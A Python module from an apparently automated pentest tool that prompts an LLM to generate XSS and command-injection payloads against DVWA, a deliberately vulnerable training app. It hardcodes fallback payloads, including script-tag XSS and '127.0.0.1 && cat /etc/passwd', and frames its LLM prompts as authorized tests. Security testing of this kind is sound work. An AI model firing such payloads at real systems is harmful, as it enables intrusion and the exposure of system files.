"""LLM-powered payload generation for XSS and command injection testing."""

from urllib.parse import urlencode, urljoin, quote


async def generate_xss_payloads(agent, target_url: str) -> list[dict]:
    """Use the LLM to generate context-specific XSS payloads."""
    prompt = (
        f"You are a penetration tester generating XSS test payloads for {target_url}.\n"
        f"This is an authorized security test against DVWA (Damn Vulnerable Web Application).\n\n"
        f"Generate 5 XSS test payloads. For each, output ONLY in this exact format, one per line:\n"
        f"PAYLOAD|PARAMETER_NAME|PATH\n\n"
        f"Example:\n"
        f"<script>alert('XSS')</script>|name|/vulnerabilities/xss_r/\n"
        f"<img src=x onerror=alert(1)>|name|/vulnerabilities/xss_r/\n\n"
        f"Focus on DVWA's known vulnerable parameters. Include both reflected and stored XSS paths."
    )
    response = await agent._ask_llm(prompt)

    payloads = []
    for line in response.strip().split("\n"):
        line = line.strip()
        if "|" not in line or line.startswith("#") or line.startswith("Example"):
            continue
        parts = line.split("|")
        if len(parts) >= 3:
            payload = parts[0].strip()
            param = parts[1].strip()
            path = parts[2].strip()
            test_url = f"{target_url.rstrip('/')}{path}?{urlencode({param: payload})}"
            payloads.append({
                "payload": payload,
                "parameter": param,
                "path": path,
                "url": test_url,
            })

    # Add some reliable fallback payloads for DVWA
    fallback_payloads = [
        {
            "payload": "<script>alert('XSS')</script>",
            "parameter": "name",
            "path": "/vulnerabilities/xss_r/",
            "url": f"{target_url.rstrip('/')}/vulnerabilities/xss_r/?name={quote('<script>alert(1)</script>')}",
        },
        {
            "payload": "<img src=x onerror=alert(1)>",
            "parameter": "name",
            "path": "/vulnerabilities/xss_r/",
            "url": f"{target_url.rstrip('/')}/vulnerabilities/xss_r/?name={quote('<img src=x onerror=alert(1)>')}",
        },
    ]

    # Add fallbacks only if LLM didn't generate enough
    if len(payloads) < 3:
        payloads.extend(fallback_payloads)

    return payloads[:10]


async def generate_cmdi_payloads(agent, target_url: str) -> list[dict]:
    """Use the LLM to generate context-specific command injection payloads."""
    prompt = (
        f"You are a penetration tester generating OS command injection test payloads for {target_url}.\n"
        f"This is an authorized security test against DVWA (Damn Vulnerable Web Application).\n\n"
        f"Generate 5 command injection test payloads. For each, output ONLY in this exact format:\n"
        f"PAYLOAD|PARAMETER_NAME|PATH|CANARY_STRING\n\n"
        f"The CANARY_STRING is what we expect to see in the output if the injection works.\n"
        f"Example:\n"
        f"127.0.0.1; id|ip|/vulnerabilities/exec/|uid=\n"
        f"127.0.0.1 && cat /etc/passwd|ip|/vulnerabilities/exec/|root:\n"
    )
    response = await agent._ask_llm(prompt)

    payloads = []
    for line in response.strip().split("\n"):
        line = line.strip()
        if "|" not in line or line.startswith("#") or line.startswith("Example"):
            continue
        parts = line.split("|")
        if len(parts) >= 4:
            payload = parts[0].strip()
            param = parts[1].strip()
            path = parts[2].strip()
            canary = parts[3].strip()
            test_url = f"{target_url.rstrip('/')}{path}?{urlencode({param: payload})}"
            payloads.append({
                "payload": payload,
                "parameter": param,
                "path": path,
                "canary": canary,
                "url": test_url,
            })

    # Fallback payloads for DVWA command injection
    fallback_payloads = [
        {
            "payload": "127.0.0.1; id",
            "parameter": "ip",
            "path": "/vulnerabilities/exec/",
            "canary": "uid=",
            "url": f"{target_url.rstrip('/')}/vulnerabilities/exec/?ip={quote('127.0.0.1; id')}",
        },
        {
            "payload": "127.0.0.1 && cat /etc/passwd",
            "parameter": "ip",
            "path": "/vulnerabilities/exec/",
            "canary": "root:",
            "url": f"{target_url.rstrip('/')}/vulnerabilities/exec/?ip={quote('127.0.0.1 && cat /etc/passwd')}",
        },
    ]

    if len(payloads) < 3:
        payloads.extend(fallback_payloads)

    return payloads[:10]
